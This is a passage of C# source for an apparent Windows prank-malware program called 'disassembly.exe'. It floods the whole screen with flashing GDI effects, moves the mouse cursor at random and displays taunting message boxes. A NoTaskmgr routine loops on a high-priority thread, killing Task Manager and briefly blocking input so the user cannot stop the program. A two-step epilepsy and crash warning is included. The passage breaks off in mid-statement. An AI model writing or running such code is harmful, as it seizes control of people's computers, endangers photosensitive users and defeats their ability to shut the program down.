            bmi.bmiHeader.biPlanes = 1;
            bmi.bmiHeader.biBitCount = 24;
            bmi.bmiHeader.biCompression = 0; // BI_RGB
            int stride = ((x * 3 + 3) & ~3);


            Point mousepos;
            IntPtr bitsPtr;
            IntPtr hBitmap = CreateDIBSection(hdc, ref bmi, DIB_RGB_COLORS, out bitsPtr, IntPtr.Zero, 0);
            IntPtr oldBitmap = SelectObject(memDC, hBitmap);
            stopwatch.Restart();
            while (stopwatch.ElapsedMilliseconds < duration)
            {

                int randsec = rnd.Next(x);
                int randx = rnd.Next(x);
                int randy = rnd.Next(y);
                BitBlt(hdc, randsec, rnd.Next(-100, 100), rnd.Next(600), y, hdc, randsec, 0, Rop.SRCCOPY);
                BitBlt(memDC, 0, 0, x, y, hdc, 0, 0, Rop.SRCCOPY);

                // Copy pixels to managed array
                byte[] buffer = new byte[stride * y];
                Marshal.Copy(bitsPtr, buffer, 0, buffer.Length);

                // Grayscale conversion
                for (int rowY = 0; rowY < y; rowY++)
                {
                    int rowStart = rowY * stride;
                    for (int colX = 0; colX < x; colX++)
                    {
                        int i = rowStart + colX * 3;
                        byte b = buffer[i];
                        byte g = buffer[i + 1];
                        byte rValue = buffer[i + 2];
                        byte gray = (byte)((rValue + g + b) / 3);
                        buffer[i] = buffer[i + 1] = buffer[i + 2] = gray;
                    }
                }

                // Copy back and draw
                Marshal.Copy(buffer, 0, bitsPtr, buffer.Length);
                BitBlt(hdc, 0, 0, x, y, memDC, 0, 0, Rop.SRCCOPY);

                // diagonal \
                MoveToEx(hdc, randx, randy, IntPtr.Zero);
                LineTo(hdc, randx + 500, randy + 200);

                // diagonal /
                MoveToEx(hdc, randx + 500, randy, IntPtr.Zero);
                LineTo(hdc, randx, randy + 200);
                PatBlt(hdc, 0, 0, x, y, Rop.DSTINVERT);


                GetCursorPos(out mousepos);
                int offsetX = rnd.Next(-50, 50);
                int offsetY = rnd.Next(-50, 50);
                SetCursorPos(mousepos.X + offsetX, mousepos.Y + offsetY);


                GetCursorPos(out mousepos);
                DrawIcon(hdc, mousepos.X - 16, mousepos.Y - 16, drawicon);

                StretchBlt(hdc, randsec, randy, x - randsec, y - randy,
                           memDC, 0, 0, x, y, Rop.SRCAND);


            }
            // cleanup
            SelectObject(hdc, oldPen);
            DeleteObject(pen);
            SelectObject(memDC, oldBitmap);
            DeleteObject(hBitmap);
            DeleteObject(drawicon);
            DeleteDC(hdc);
            DeleteDC(memDC);
        }

        public static void blackness(int duration)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            stopwatch.Restart();
            while (stopwatch.ElapsedMilliseconds < 2000)
            {
                DisplayBitmap("disassembly.nosignal.jpg");
            }
            stopwatch.Restart();
            while (stopwatch.ElapsedMilliseconds < duration / 2)
            {
                PatBlt(hdc, 0, 0, x, y, Rop.BLACKNESS);
            }
            while (stopwatch.ElapsedMilliseconds < duration)
            {
                DisplayBitmap("disassembly.img.png");
            }
            stopwatch.Restart();
            while (stopwatch.ElapsedMilliseconds < 1000)
            {
                PatBlt(hdc, 0, 0, x, y, Rop.BLACKNESS);
            }
            ReleaseDC(IntPtr.Zero, hdc);
        }

        public static void mainpayload1(int duration)
        {
            int scrollSpeed = 220;
            int screenOffset = 0;
            rnd = new Random();
            stopwatch.Restart();

            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr memDC = CreateCompatibleDC(hdc);
            IntPtr bitmap = CreateCompatibleBitmap(hdc, x, y);
            IntPtr old = SelectObject(memDC, bitmap);

            while (stopwatch.ElapsedMilliseconds < duration)
            {
                int rndx = rnd.Next(x);
                int rndy = rnd.Next(y);
                BitBlt(memDC, 0, 0, x, y, hdc, 0, 0, Rop.SRCCOPY);
                // Clear screen
                PatBlt(hdc, 0, 0, x, y, Rop.BLACKNESS);
                // Draw multiple "screens" scrolling horizontally
                IntPtr hatchbrush = CreateHatchBrush(rnd.Next(10), colors[rnd.Next(colors.Length)]);
                IntPtr drawicon = LoadIcon(IntPtr.Zero, (IntPtr)rndicons[rnd.Next(rndicons.Length)]);
                for (int screenNum = -1; screenNum <= 2; screenNum++)
                {
                    int yPos = (screenNum * y) - screenOffset;

                    if (yPos > -y && yPos < y)  // Changed to check y bounds
                    {
                        BitBlt(hdc, 0, yPos, x, y, memDC, 0, 0, Rop.SRCCOPY);
                        // Odd screens: random color
                        SelectObject(memDC, hatchbrush);
                        PatBlt(memDC, 0, 0, x, y, Rop.PATINVERT);
                        DeleteObject(hatchbrush);

                    }

                }
                screenOffset += scrollSpeed;  // MOVED OUTSIDE THE FOR LOOP
                if (screenOffset >= y) screenOffset = 0;

                IntPtr hFont = CreateFont(-100, 0, 0, 0, 1000, 0, 0, 0, 1, 0, 0, 0, 0, "System");
                IntPtr oldFont = SelectObject(hdc, hFont);
                SetTextColor(hdc, (int)colors[rnd.Next(colors.Length)]);
                SetBkMode(hdc, 1);

                PatBlt(hdc, 0, 0, x, y, Rop.DSTINVERT);
                TextOut(hdc, rndx, rndy, text[rnd.Next(text.Length)], text[rnd.Next(text.Length)].Length);

                // Proper font cleanup
                SelectObject(hdc, oldFont);  // Restore old font FIRST
                DeleteObject(hFont);         // Then delete new font

                SelectObject(hdc, drawicon);
                DrawIcon(hdc, rndx + rnd.Next(-50, 50), rndy + rnd.Next(-50, 50), drawicon);
                DeleteObject(drawicon);

                //melt horizontally

                int randsec = rnd.Next(y);
                BitBlt(hdc, rnd.Next(-16, 16), randsec, x, rnd.Next(300), hdc, randsec, 0, Rop.SRCCOPY);

                StretchBlt(hdc, randsec, rndy, x - randsec, y - rndy,
                memDC, 0, 0, x, y, Rop.SRCAND);


                Thread.Sleep(20);
            }

            SelectObject(memDC, old);
            DeleteObject(bitmap);
            DeleteDC(memDC);
            DeleteDC(hdc);
        }

        public static void circles(int duration)
        {
            stopwatch.Restart();
            rnd = new Random();
            
            while (stopwatch.ElapsedMilliseconds < duration)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                
                // Create compatible DC for double buffering
                IntPtr memDC = CreateCompatibleDC(hdc);
                IntPtr hBitmap = CreateCompatibleBitmap(hdc, x, y);
                IntPtr oldBitmap = SelectObject(memDC, hBitmap);

                // Random center points
                int centerX = rnd.Next(x);
                int centerY = rnd.Next(y);

                // Parameters for the effect
                int maxRadius = rnd.Next(100, Math.Min(x,y)/2);
                int step = rnd.Next(10, 30);
                
                // Draw concentric circles with blending
                for (int r = maxRadius; r > 0; r -= step)
                {
                    // Create random colored brush
                    uint color = colors[rnd.Next(colors.Length)];
                    IntPtr brush = CreateSolidBrush(color);
                    IntPtr oldBrush = SelectObject(hdc, brush);
                    
                    // Draw filled circle
                    Ellipse(hdc, centerX - r, centerY - r, centerX + r, centerY + r);
                    
                    // Cleanup brush
                    SelectObject(hdc, oldBrush);
                    DeleteObject(brush);

                    // Add some visual effects
                    BitBlt(hdc, 2, 2, x-2, y-2, hdc, 0, 0, Rop.SRCINVERT);
                    
                    // Rotate pattern
                    POINT[] points = new POINT[3];
                    points[0] = new POINT(centerX - r, centerY - r);
                    points[1] = new POINT(centerX + r, centerY - r);
                    points[2] = new POINT(centerX, centerY + r);
                    
                    PlgBlt(hdc, points, hdc, centerX - r, centerY - r, r*2, r*2, IntPtr.Zero, 0, 0);
                }

                // Cleanup
                SelectObject(memDC, oldBitmap);
                DeleteObject(hBitmap);
                DeleteDC(memDC);
                ReleaseDC(IntPtr.Zero, hdc);
                
                Thread.Sleep(50); // Shorter delay for smoother animation
            }
        }
        public static void DisplayBitmap(string file)
        {
            try
            {
                // Load bitmap from embedded resource
                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(file))
                {
                    if (stream == null)
                    {
                        MessageBox(IntPtr.Zero, "Resource not found in assembly", "Error", 0);
                        return;
                    }

                    using (Bitmap bitmap = new Bitmap(stream))
                    {
                        if (bitmap.Width <= 0 || bitmap.Height <= 0)
                        {
                            MessageBox(IntPtr.Zero, "Invalid bitmap dimensions", "Error", 0);
                            return;
                        }

                        IntPtr screenDC = GetDC(IntPtr.Zero);
                        IntPtr memDC = CreateCompatibleDC(screenDC);
                        IntPtr hBitmap = bitmap.GetHbitmap();
                        IntPtr oldBitmap = SelectObject(memDC, hBitmap);

                        StretchBlt(screenDC, 0, 0, x, y,
                                 memDC, 0, 0, bitmap.Width, bitmap.Height,
                                 Rop.SRCCOPY);

                        // Cleanup
                        SelectObject(memDC, oldBitmap);
                        DeleteObject(hBitmap);
                        DeleteDC(memDC);
                        ReleaseDC(IntPtr.Zero, screenDC);
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox(IntPtr.Zero, $"Error: {ex.Message}", "Error", 0);
            }
        }

        public static void mainpayload2(int duration)
        {
            stopwatch.Restart();
            rnd = new Random();
            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr memDC = CreateCompatibleDC(hdc);
            IntPtr hBitmap = CreateCompatibleBitmap(GetDC(IntPtr.Zero), x, y);
            IntPtr oldBitmap = SelectObject(memDC, hBitmap);

            while (stopwatch.ElapsedMilliseconds < duration)
            {
                IntPtr brush = CreateSolidBrush(colors[rnd.Next(colors.Length)]);
                // Create array of vertices for multiple triangles
                TRIVERTEX[] vertices = new TRIVERTEX[6];

                // Create pulsing color effect using sine wave
                double time = stopwatch.ElapsedMilliseconds / 1000.0;
                int pulse = (int)(Math.Sin(time * 2) * 127 + 128);

                // Generate triangle vertices with dynamic colors
                for (int i = 0; i < vertices.Length; i++)
                {
                    vertices[i] = new TRIVERTEX(
                        rnd.Next(-100, x + 100),
                        rnd.Next(-100, y + 100),
                        (ushort)((pulse + rnd.Next(128)) * 256),
                        (ushort)((pulse + rnd.Next(128)) * 256),
                        (ushort)((pulse + rnd.Next(128)) * 256),
                        0xFF00
                    );
                }

                // Create gradient rectangles instead of triangles
                GRADIENT_RECT[] gRects = new GRADIENT_RECT[2];
                gRects[0] = new GRADIENT_RECT(0, 1);
                gRects[1] = new GRADIENT_RECT(2, 3);

                // Draw gradient rectangles
                GradientFill(hdc, vertices, (uint)vertices.Length, gRects, (uint)gRects.Length, GRADIENT_FILL.RECT_H);

                // Add visual effects
                BitBlt(memDC, 0, 0, x, y, hdc, 0, 0, Rop.SRCCOPY);
                StretchBlt(hdc, rnd.Next(-5, 5), rnd.Next(-5, 5), x, y, memDC, 0, 0, x, y, Rop.SRCINVERT);
                SelectObject(hdc, brush);
                //draw random polygons
                Polygon(hdc, new POINT[]
                {
                    new POINT(rnd.Next(x), rnd.Next(y)),
                    new POINT(rnd.Next(x), rnd.Next(y)),
                    new POINT(rnd.Next(x), rnd.Next(y)),
                    new POINT(rnd.Next(x), rnd.Next(y))
                }, 4);

                // Text output
                for (int i = 0; i < 10; i++)
                {
                    IntPtr hFont = CreateFont(-70, 0, 0, 0, 1000, 0, 0, 0, 1, 0, 0, 0, 0, "System");
                    IntPtr oldFont = SelectObject(hdc, hFont);
                    SetTextColor(hdc, (int)colors[rnd.Next(colors.Length)]);
                    SetBkMode(hdc, 1);
                    TextOut(hdc, rnd.Next(x), rnd.Next(y), text[rnd.Next(text.Length)], text[rnd.Next(text.Length)].Length);
                    DeleteObject(hFont);
                    DeleteObject(oldFont);
                }
                int possibleBitmap = rnd.Next(6);

                if (possibleBitmap == 1)
                {
                    //copy the old screen
                    IntPtr memDC2 = CreateCompatibleDC(hdc);
                    IntPtr hbitmap2 = CreateCompatibleBitmap(hdc, x, y);
                    IntPtr oldBitmap2 = SelectObject(memDC2, hbitmap2);
                    //copy old screen into hbitmap2
                    BitBlt(memDC2, 0, 0, x, y, memDC, 0, 0, Rop.SRCCOPY);
                    DisplayBitmap("disassembly.img.png"); // Display bitmap if condition met
                    Thread.Sleep(50); // Wait for a second to show the bitmap
                    SelectObject(hdc, brush);
                    PatBlt(hdc, 0, 0, x, y, Rop.PATINVERT);
                    Thread.Sleep(50); // Wait for a second to show the bitmap
                    //display old screen
                    BitBlt(hdc, 0, 0, x, y, memDC2, 0, 0, Rop.SRCCOPY);
                    SelectObject(memDC2, oldBitmap2);
                    DeleteObject(hbitmap2);
                    DeleteDC(memDC2);

                }
                if (possibleBitmap == 2)
                {
                    //copy the old screen
                    IntPtr memDC2 = CreateCompatibleDC(hdc);
                    IntPtr hbitmap2 = CreateCompatibleBitmap(hdc, x, y);
                    IntPtr oldBitmap2 = SelectObject(memDC2, hbitmap2);
                    //copy old screen into hbitmap2
                    BitBlt(memDC2, 0, 0, x, y, memDC, 0, 0, Rop.SRCCOPY);
                    DisplayBitmap("disassembly.solver.png"); // Display bitmap if condition met
                    Thread.Sleep(50); // Wait for a second to show the bitmap
                    SelectObject(hdc, brush);
                    PatBlt(hdc, 0, 0, x, y, Rop.PATINVERT);
                    Thread.Sleep(50); // Wait for a second to show the bitmap
                    //display old screen
                    BitBlt(hdc, 0, 0, x, y, memDC2, 0, 0, Rop.SRCCOPY);
                    SelectObject(memDC2, oldBitmap2);
                    DeleteObject(hbitmap2);
                    DeleteDC(memDC2);

                }
                if (possibleBitmap == 3)
                {
                    //copy the old screen
                    IntPtr memDC2 = CreateCompatibleDC(hdc);
                    IntPtr hbitmap2 = CreateCompatibleBitmap(hdc, x, y);
                    IntPtr oldBitmap2 = SelectObject(memDC2, hbitmap2);
                    //copy old screen into hbitmap2
                    BitBlt(memDC2, 0, 0, x, y, memDC, 0, 0, Rop.SRCCOPY);
                    DisplayBitmap("disassembly.null.jpg"); // Display bitmap if condition met
                    Thread.Sleep(50); // Wait for a second to show the bitmap
                    SelectObject(hdc, brush);
                    PatBlt(hdc, 0, 0, x, y, Rop.PATINVERT);
                    Thread.Sleep(50); // Wait for a second to show the bitmap
                    //display old screen
                    BitBlt(hdc, 0, 0, x, y, memDC2, 0, 0, Rop.SRCCOPY);
                    SelectObject(memDC2, oldBitmap2);
                    DeleteObject(hbitmap2);
                    DeleteDC(memDC2);

                }



                DeleteObject(brush);
                Thread.Sleep(20);
            }

            // Cleanup
            SelectObject(memDC, oldBitmap);
            DeleteObject(hBitmap);
            DeleteDC(memDC);
            DeleteDC(hdc);
        }

        public static void ScreenShader(int duration)
        {
            stopwatch.Restart();
            rnd = new Random();
            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr memDC = CreateCompatibleDC(hdc);
            BallAndTextBounce(duration);

            // Setup DIB section for direct pixel manipulation
            BITMAPINFO bmi = new BITMAPINFO();
            bmi.bmiHeader.biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER));
            bmi.bmiHeader.biWidth = x;
            bmi.bmiHeader.biHeight = -y; // Negative for top-down
            bmi.bmiHeader.biPlanes = 1;
            bmi.bmiHeader.biBitCount = 24;
            bmi.bmiHeader.biCompression = 0;

            int stride = ((x * 3 + 3) & ~3);
            IntPtr bitsPtr;
            IntPtr hBitmap = CreateDIBSection(hdc, ref bmi, DIB_RGB_COLORS, out bitsPtr, IntPtr.Zero, 0);
            IntPtr oldBitmap = SelectObject(memDC, hBitmap);

            double time = 0;

            while (stopwatch.ElapsedMilliseconds < duration)
            {
                BitBlt(memDC, 0, 0, x, y, hdc, 0, 0, Rop.SRCCOPY);

                byte[] buffer = new byte[stride * y];
                Marshal.Copy(bitsPtr, buffer, 0, buffer.Length);

                time += 0.1;
                int offset = (int)(Math.Sin(time) * 10);

                for (int py = 0; py < y; py++)
                {
                    int rowOffset = py * stride;
                    float scanlineIntensity = (py % 2 == 0) ? 0.7f : 1.0f;
                    float colorPhase = (float)py / y + (float)time;
                    float colorIntensity = (float)(Math.Sin(colorPhase * 5) * 0.5 + 0.5);

                    for (int px = 0; px < x; px++)
                    {
                        int i = rowOffset + px * 3;

                        // Ensure we don't exceed buffer bounds
                        if (i + 2 >= buffer.Length) continue;

                        // Safe pixel reading with bounds checking
                        byte b = buffer[i];
                        byte g = i + 1 < buffer.Length ? buffer[i + 1] : (byte)0;
                        byte r = i + 2 < buffer.Length ? buffer[i + 2] : (byte)0;

                        // Calculate offsets with clamping
                        int redOffset = Math.Min(Math.Max((int)(offset * Math.Sin(py * 0.1 + time)), -px), x - px);
                        int greenOffset = Math.Min(Math.Max((int)(offset * Math.Sin(py * 0.1 + time + 2)), -px), x - px);
                        int blueOffset = Math.Min(Math.Max((int)(offset * Math.Sin(py * 0.1 + time + 4)), -px), x - px);

                        // Calculate new positions with safe bounds
                        int newRed = Math.Max(0, Math.Min(((px + redOffset) * 3 + rowOffset), buffer.Length - 3));
                        int newGreen = Math.Max(0, Math.Min(((px + greenOffset) * 3 + rowOffset), buffer.Length - 3));
                        int newBlue = Math.Max(0, Math.Min(((px + blueOffset) * 3 + rowOffset), buffer.Length - 3));

                        // Safe writing with intensity modulation
                        buffer[newBlue] = (byte)(b * scanlineIntensity * (1 + colorIntensity));
                        buffer[newGreen + 1] = (byte)(g * scanlineIntensity);
                        buffer[newRed + 2] = (byte)(r * scanlineIntensity * (1 + colorIntensity));
                    }
                }

                Marshal.Copy(buffer, 0, bitsPtr, buffer.Length);
                BitBlt(hdc, 0, 0, x, y, memDC, 0, 0, Rop.SRCCOPY);

                // Visual effects with safe random ranges
                StretchBlt(hdc, rnd.Next(-5, 5), rnd.Next(-5, 5), x, y, memDC, 0, 0, x, y, Rop.SRCAND);
                PatBlt(hdc, 0, 0, x, y, Rop.DSTINVERT);

                Thread.Sleep(10); // Add small delay to reduce CPU usage
            }

            // Cleanup
            SelectObject(memDC, oldBitmap);
            DeleteObject(hBitmap);
            DeleteDC(memDC);
            ReleaseDC(IntPtr.Zero, hdc);
        }

        public static void BallAndTextBounce(int duration)
        {
            Task.Run(() =>
            {
                stopwatch.Restart();
                rnd = new Random();
                IntPtr hdc = GetDC(IntPtr.Zero);
                // Ball-Parameter
                int ballSize = 150;
                int posX = rnd.Next(x - ballSize);
                int posY = rnd.Next(y - ballSize);
                int dx = rnd.Next(10) == 0 ? 6 : -10;
                int dy = rnd.Next(10) == 0 ? 6 : -10;
                int textsize = 30;
                int posXt = rnd.Next(x - textsize);
                int posYt = rnd.Next(y - textsize);
                int dxt = rnd.Next(10) == 0 ? 6 : -15;
                int dyt = rnd.Next(10) == 0 ? 6 : -15;
                IntPtr hFont = CreateFont(-textsize, 0, 0, 0, 1000, 0, 0, 0, 1, 0, 0, 0, 0, "System");
                IntPtr oldFont = SelectObject(hdc, hFont);
                while (stopwatch.ElapsedMilliseconds < duration)
                {
                    IntPtr brush1 = CreateSolidBrush(0x000000);
                    SelectObject(hdc, brush1);
                    SetBkMode(hdc, 1);
                    posX += dx;
                    posY += dy;
                    Ellipse(hdc, posX, posY, posX + ballSize, posY + ballSize);
                    DeleteObject(brush1);
                    if (posX <= 0 || posX + ballSize >= x)
                    {
                        dx = -dx;
                    }
                    if (posY <= 0 || posY + ballSize >= y)
                    {
                        dy = -dy;
                    }
                    posXt += dxt;
                    posYt += dyt;
                    SetTextColor(hdc, (int)colors[rnd.Next(colors.Length)]);
                    SetBkMode(hdc, 1);
                    TextOut(hdc, posXt, posYt, text[rnd.Next(text.Length)], text[rnd.Next(text.Length)].Length);
                    if (posXt <= 0 || posXt + textsize >= x)
                    {
                        dxt = -dxt;
                    }
                    if (posYt <= 0 || posYt + textsize >= y)
                    {
                        dyt = -dyt;
                    }
                    Thread.Sleep(1);
                }
                SelectObject(hdc, oldFont);
                DeleteObject(hFont);
                ReleaseDC(IntPtr.Zero, hdc);
            });
        }
        public static void rgbquadeffectidk(int duration)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr memDC = CreateCompatibleDC(hdc);
            IntPtr hBitmap = CreateCompatibleBitmap(hdc, x, y);
            IntPtr oldBitmap = SelectObject(memDC, hBitmap);

            BITMAPINFO bmi = new BITMAPINFO();
            bmi.bmiHeader.biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER));
            bmi.bmiHeader.biWidth = x;
            bmi.bmiHeader.biHeight = -y;
            bmi.bmiHeader.biPlanes = 1;
            bmi.bmiHeader.biBitCount = 24;
            bmi.bmiHeader.biCompression = 0;

            int stride = ((x * 3 + 3) & ~3);
            IntPtr bits;
            IntPtr dibSection = CreateDIBSection(hdc, ref bmi, DIB_RGB_COLORS, out bits, IntPtr.Zero, 0);
            IntPtr oldDib = SelectObject(memDC, dibSection);

            rnd = new Random();
            stopwatch.Restart();

            while (stopwatch.ElapsedMilliseconds < duration)
            {
                BitBlt(memDC, 0, 0, x, y, hdc, 0, 0, Rop.SRCCOPY);

                byte[] buffer = new byte[stride * y];
                Marshal.Copy(bits, buffer, 0, buffer.Length);

                // Process pixels (each pixel is 3 bytes - BGR format)
                for (int i = 0; i < buffer.Length - 2; i += 3)
                {
                    byte b = buffer[i];
                    byte g = buffer[i + 1];
                    byte r = buffer[i + 2];

                    // Rotate colors
                    buffer[i] = (byte)((r * g * b) / 2);    
                    buffer[i + 1] = (byte)((b + r + g) + Math.Sin(i / 20)); 
                    buffer[i + 2] = (byte)((g * b * r) + 5); 
                }

                Marshal.Copy(buffer, 0, bits, buffer.Length);
                BitBlt(hdc, 0, 0, x, y, memDC, 0, 0, Rop.SRCCOPY);

                //Add some visual effects

                IntPtr hfont = CreateFont(-70, 0, 0, 0, 1000, 0, 0, 0, 1, 0, 0, 0, 0, "System");
                IntPtr oldFont = SelectObject(hdc, hfont);

                SetBkMode(hdc, 1);
                SetTextColor(hdc, (int)colors[rnd.Next(colors.Length)]);

                TextOut(hdc, rnd.Next(x), rnd.Next(y), text[rnd.Next(text.Length)], text[rnd.Next(text.Length)].Length);

                DeleteObject(hfont);
                DeleteObject(oldFont);

                Thread.Sleep(10); // Adjust sleep for smoother animation
            }

            SelectObject(memDC, oldDib);
            DeleteObject(dibSection);
            SelectObject(memDC, oldBitmap);
            DeleteObject(hBitmap);
            DeleteDC(memDC);
            ReleaseDC(IntPtr.Zero, hdc);
        }

        

        public static void Message()
        {
            new Thread(() =>
            {
                MessageBox(IntPtr.Zero, "The disassembly drones are coming to kill your pc in a few seconds, so you should use your pc while its still here. Also, you can't use taskmgr anymore >:)", "FUCKED BY DISASSEMBLY.EXE", 0x00000030); // MB_ICONWARNING
            }).Start();

            Thread.Sleep(20000); // Wait for the message box to be dismissed

        }
        public static void startWarning()
        {
            // display a warning message to the user if they want to continue
            // 3 = MB_YESNOCANCEL, 48 = MB_ICONWARNING, combined with bitwise OR
            uint type = 0x04 | 48;
            int result = MessageBox(IntPtr.Zero,
                "The program will take control of your mouse and screen and will play loud noises. It is capable of crashing or shutting down your PC. Save your work before continuing. EPILEPSY WARNING! Do you still want to execute it?",
                "disassembly.exe -- WARNING",
                type
            );
            if (result == 6)
            {
                int result2 = MessageBox(IntPtr.Zero,
                    "THIS IS THE FINAL WARNING! DO YOU STILL WANT TO EXECUTE IT?",
                    "disassembly.exe -- FINAL WARNING",
                    type
                );

                if (result2 == 6)
                {
                    // User clicked Yes, continue with the program
                    return;
                }
                else if (result2 == 7 || result2 == 2)
                {
                    // User clicked No or Cancel, exit the program
                    Environment.Exit(0);
                }
                else
                {
                    // Unexpected result, exit the program
                    Environment.Exit(0);
                }

            }
            else if (result == 7 || result == 2)
            {
                // User clicked No or Cancel, exit the program
                Environment.Exit(0);
            }
            else
            {
                // Unexpected result, exit the program
                Environment.Exit(0);
            }
        }

        public static void NoTaskmgr()
        {
            Thread notaskmgr = new Thread(() =>
            {
                while (true)
                {
                    // Check for both "taskmgr" and "Taskmgr" processes
                    Process[] processes = Process.GetProcessesByName("taskmgr");
                    Process[] processes2 = Process.GetProcessesByName("Taskmgr");

                    foreach (Process process in processes.Concat(processes2))
                    {
                        try
                        {
                            if (!process.HasExited)
                            {
                                process.Kill();
                                process.WaitForExit(1000); // Wait up to 1 second for process to exit
                            }
                        }
                        catch (Exception ex)
                        {
                            // Log error but continue execution
                            Console.WriteLine($"Error killing Task Manager: {ex.Message}");
                        }
                    }

                    // Also try to prevent Task Manager from starting
                    try
                    {
                        BlockInput(true); // Block user input briefly
                        Thread.Sleep(100);
                        BlockInput(false);
                    }
                    catch { }

                    Thread.Sleep(100); // Check more frequently
                }
            });

            notaskmgr.IsBackground = true;
            notaskmgr.Priority = ThreadPriority.Highest; // Set high priority
            notaskmgr.Start();
        }

        public static void FinalPayload(int duration)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr memDC = CreateCompatibleDC(hdc);
            IntPtr hBitmap = CreateCompatibleBitmap(hdc, x, y);
            IntPtr oldBitmap = SelectObject(memDC, hBitmap);
            stopwatch.Restart();

            //bitmap info for shader

            BITMAPINFO bmi = new BITMAPINFO();
            bmi.bmiHeader.biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER));
            bmi.bmiHeader.biWidth = x;
            bmi.bmiHeader.biHeight = -y; // Negative for top-down
            bmi.bmiHeader.biPlanes = 1;
            bmi.bmiHeader.biBitCount = 24;
            bmi.bmiHeader.biCompression = 0;
            POINT[] lppoint = new POINT[3];
            int stride = ((x * 3 + 3) & ~3);
            IntPtr bitsPtr;
            IntPtr dibSection = CreateDIBSection(hdc, ref bmi, DIB_RGB_COLORS, out bitsPtr, IntPtr.Zero, 0);
            IntPtr oldDib = SelectObject(memDC, dibSection);
            int scrollOffset = 10;
            int scrollSpeed = 100;
           

            rnd = new Random();
            while (stopwatch.ElapsedMilliseconds < duration)
            {
                int mouseX = 0;
                int mouseY = 0;
                bool verticalScroll = true;
                IntPtr hatchbrush = CreateHatchBrush(rnd.Next(10), colors[rnd.Next(colors.Length)]);
                IntPtr brush = CreateSolidBrush(colors[rnd.Next(colors.Length)]);

                BitBlt(memDC, 0, 0, x, y, hdc, 0, 0, Rop.SRCCOPY);
                byte[] buffer = new byte[stride * y];
                Marshal.Copy(bitsPtr, buffer, 0, buffer.Length);
                // Process pixels (each pixel is 3 bytes - BGR format)
                for (int rowY = 0; rowY < y; rowY++)
                {
                    for (int colX = 0; colX < x; colX++)
                    {
                        int i = (rowY * stride) + (colX * 3);
                        if (i + 2 >= buffer.Length) continue; // Ensure we don't exceed buffer bounds
                        // Safe pixel reading with bounds checking
                        byte b = buffer[i];
                        byte g = i + 3 < buffer.Length ? buffer[i + 1] : (byte)0;
                        byte r = i + 2 < buffer.Length ? buffer[i + 2] : (byte)0;
                        // Apply a simple color transformation
                        buffer[i + 1] = (byte)(1 + (rowY * 4)); // Average for grayscale effect
                        buffer[i + 1] = (byte)((2 * (rowY * 4)));
                        buffer[i + 3] = (byte)(((1 * (colX * 2))));
                    }
                }
                Marshal.Copy(buffer, 0, bitsPtr, buffer.Length);
                // Add some visual effects
                // Screen Scoll effect

                PatBlt(hdc, 0, 0, x, y, Rop.DSTINVERT);
                mouseX = rnd.Next(x);
                mouseY = rnd.Next(y);

                SetCursorPos(mouseX, mouseY);

                int horizontalChance = rnd.Next(5);


                if ( horizontalChance < 2 )
                {
                    verticalScroll = false;
                    
                }

                if (verticalScroll)
                {
                    BitBlt(hdc, 0, scrollOffset, x, y - scrollOffset, memDC, 0, 0, Rop.SRCCOPY);
                    BitBlt(hdc, 0, 0, x, scrollOffset, memDC, 0, y - scrollOffset, Rop.SRCCOPY);
                }
                else
                {
                    BitBlt(hdc, scrollOffset, 0, x - scrollOffset, y, memDC, 0, 0, Rop.SRCCOPY);
                    BitBlt(hdc, 0, 0, scrollOffset, y, memDC, x - scrollOffset, 0, Rop.SRCCOPY);
                }

                if (rnd.Next(100) < 20) // 20% Chance für Glitch-Effekt
                {
                    int glitchHeight = rnd.Next(50, 150);
                    int glitchY = rnd.Next(0, y - glitchHeight);
                    BitBlt(hdc, rnd.Next(-10, 10), glitchY, x, glitchHeight,
                           memDC, 0, glitchY, Rop.SRCINVERT);
                }

                scrollOffset += scrollSpeed;
                if (verticalScroll)
                {
                    if (scrollOffset >= y) scrollOffset = 0;
                }
                else
                {
                    if (scrollOffset >= x) scrollOffset = 0;
                }


                if (rnd.Next(2) == 1)
                {
                    lppoint[0].X = (left + 30) + 0;
                    lppoint[0].Y = (top - 30) + 0;
                    lppoint[1].X = (right + 30) + 0;
                    lppoint[1].Y = (top + 30) + 0;
                    lppoint[2].X = (left - 30) + 0;
                    lppoint[2].Y = (bottom - 30) + 0;
                }
                else
                {
                    lppoint[0].X = (left - 30) + 0;
                    lppoint[0].Y = (top + 30) + 0;
                    lppoint[1].X = (right - 30) + 0;
                    lppoint[1].Y = (top - 30) + 0;
                    lppoint[2].X = (left + 30) + 0;
                    lppoint[2].Y = (bottom + 30) + 0;
                }
                PlgBlt(memDC, lppoint, hdc, left, top, (right - left), (bottom - top), IntPtr.Zero, 0, 0);
                AlphaBlend(hdc, 0, 0, x, y, memDC, 0, 0, x, y, new BLENDFUNCTION(0, 0, 100, 0));


                StretchBlt(memDC, rnd.Next(-8, 8), rnd.Next(-5, 5), x, y, hdc, 0, 0, x, y, Rop.SRCAND);
                SelectObject(memDC, hatchbrush);

                PatBlt(memDC, 0, 0, x, y, Rop.PATINVERT);

                

                SelectObject(hdc, brush);
                mouseX = rnd.Next(x);
                mouseY = rnd.Next(y);

                SetCursorPos(mouseX, mouseY);
                //draw shapes
                for (int i = 0; i < 10; i++)
                {
                    int shapeType = rnd.Next(4);
                    switch (shapeType)
                    {
                        case 0: // Rectangle
                            brush = CreateSolidBrush(colors[rnd.Next(colors.Length)]);
                            SelectObject(hdc, brush);
                            Rectangle(hdc, rnd.Next(x), rnd.Next(y), rnd.Next(x), rnd.Next(y));
                            break;
                        case 1: // Ellipse
                            brush = CreateSolidBrush(colors[rnd.Next(colors.Length)]);
                            SelectObject(hdc, brush);
                            Ellipse(hdc, rnd.Next(x), rnd.Next(y), rnd.Next(x), rnd.Next(y));
                            break;
                        case 2: // Round Rect
                            brush = CreateSolidBrush(colors[rnd.Next(colors.Length)]);
                            SelectObject(hdc, brush);
